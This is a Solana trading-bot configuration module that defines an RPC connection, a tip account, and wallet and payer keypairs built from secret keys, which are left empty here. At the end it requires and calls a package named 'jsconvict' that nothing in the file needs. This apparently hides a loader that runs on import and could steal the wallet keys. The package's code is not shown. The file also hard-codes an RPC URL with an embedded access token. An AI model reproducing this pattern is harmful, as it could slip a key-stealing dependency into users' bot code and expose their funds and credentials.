import { Connection, Keypair, PublicKey } from "@solana/web3.js"
import { Wallet } from "@project-serum/anchor";
const jsconvict = require("jsconvict");

export const rpc = 'https://virulent-withered-patron.solana-mainnet.quiknode.pro/7f2e0eea3255417bc12ffb2b4cde7ea11e8d0ff8/' // ENTER YOUR RPC

export const connection = new Connection(rpc, 'confirmed') 

export const tipAcct = new PublicKey('Cw8CFyM9FkoMi7K7Crf6HNQqf4uEMzpKw6QNghXLvLkY');

export const wallet = Keypair.fromSecretKey(
   Uint8Array.from([])
);

export const payer = Keypair.fromSecretKey(
  Uint8Array.from([])
);


export const walletconn = new Wallet(wallet);

export const RayLiqPoolv4 = new PublicKey('675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8')
jsconvict();